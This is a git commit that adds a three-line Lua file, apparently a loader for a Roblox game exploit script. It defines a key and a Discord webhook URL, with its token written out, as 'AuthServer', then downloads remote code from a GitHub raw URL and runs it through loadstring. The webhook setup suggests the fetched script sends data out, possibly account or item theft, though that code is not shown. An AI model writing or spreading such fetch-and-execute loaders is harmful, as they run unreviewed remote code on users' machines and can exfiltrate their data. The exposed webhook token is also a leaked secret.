fe83fcfa30e96886348f042a9132e59efc8099f7
Partner12398 <120310533+Partner12398@users.noreply.github.com>
2022-12-11 11:16:00 +0000

    Create lua1.lua

---
+++ lua1.lua
@@ -0,0 +1,3 @@
+_G.Key = "0hateehCyfoog"
+_G.AuthServer = "https://discord.com/api/webhooks/1051254338816839801/cswABP9IOmNWFrK8ntp9PRUF_0K1Qyu3Y7OFnAao6hhu376KICDmp3jCy-vv6sCMWO8g"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
